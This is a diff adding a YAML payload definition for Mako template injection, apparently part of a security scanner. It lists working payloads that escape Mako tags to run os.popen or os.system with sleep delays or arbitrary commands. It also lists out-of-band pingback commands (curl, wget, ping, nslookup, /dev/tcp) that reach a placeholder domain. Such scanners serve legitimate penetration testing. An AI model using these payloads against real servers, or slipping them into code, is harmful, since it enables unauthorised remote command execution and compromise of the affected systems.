@@ -1,0 +1,27 @@
+name: Mako
+contexts:
+  - begin: "${"
+    end: "}"
+    level: 1
+  - begin: "<%"
+    end: ""
+    level: 1
+attack_techniques:
+  - technique: "Render"
+    payloads:
+      - "{{.FirstNum}}*{{.SecondNum}}"
+  - technique: "Blind Exec Sleep"
+    payloads:
+      - "import os;x=os.popen('sleep {{.WaitTime}}').read() %>${x}"
+      - "import os;x=os.system('sleep {{.WaitTime}}') %>${x}"
+  - technique: "Blind Exec Pingback"
+    payloads:
+      - "import os;x=os.popen('{{.Cmd}}').read() %>${x}"
+      - "import os;x=os.system('{{.Cmd}}') %>${x}"
+    commands:
+      - "ping -c 1 {{.PingDomain}}"
+      - "curl {{.PingDomain}}"
+      - "host {{.PingDomain}}"
+      - "nslookup {{.PingDomain}}"
+      - "wget http://{{.PingDomain}}/ -O /dev/null"
+      - "true < /dev/tcp/{{.PingDomain}}/80"
